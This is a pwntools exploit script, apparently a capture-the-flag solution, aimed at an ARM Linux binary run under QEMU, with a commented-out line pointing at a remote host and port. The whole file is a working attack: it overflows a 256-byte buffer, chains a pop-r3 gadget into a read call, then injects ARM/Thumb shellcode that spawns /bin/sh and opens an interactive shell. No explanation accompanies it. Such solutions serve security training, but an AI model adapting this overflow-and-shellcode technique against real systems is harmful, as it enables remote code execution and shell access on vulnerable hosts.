from pwn import *
context(arch='arm',os='linux',log_level='debug')

# io = process(["qemu-arm","-g","1234","-L",".","./bin"])
io = process(["qemu-arm","-L","/usr/arm-linux-gnueabihf","./bin"])
# io = remote("139.159.210.220",9999)
# shellcode =  b'\x02\x20\x42\xe0\x1c\x30\x8f\xe2'
# shellcode += b'\x04\x30\x8d\xe5\x08\x20\x8d\xe5'
# shellcode += b'\x13\x02\xa0\xe1\x07\x20\xc3\xe5'
# shellcode += b'\x04\x30\x8f\xe2\x04\x10\x8d\xe2'
# shellcode += b'\x01\x20\xc3\xe5\x0b\x0b\x90\xef'
# shellcode += b'/bin/sh;'
shellcode = "\x01\x30\x8f\xe2"
shellcode +=  "\x13\xff\x2f\xe1"
shellcode +=   "\x78\x46\x0e\x30"
shellcode +=  "\x01\x90\x49\x1a"
shellcode +=  "\x92\x1a\x08\x27"
shellcode +=  "\xc2\x51\x03\x37"
shellcode +=  "\x01\xdf\x2f\x62"
shellcode +=  "\x69\x6e\x2f\x2f"
shellcode +=  "\x73\x68"

pop_r3_pc = 0x00010348
data_addr = 0x00021030
read_addr = 0x000104E8

payload = b'a'*256+p32(data_addr)+p32(pop_r3_pc)+p32(data_addr)+p32(read_addr)
io.sendafter("input: ",payload)
io.sendline(p32(data_addr+4)+shellcode)
io.interactive()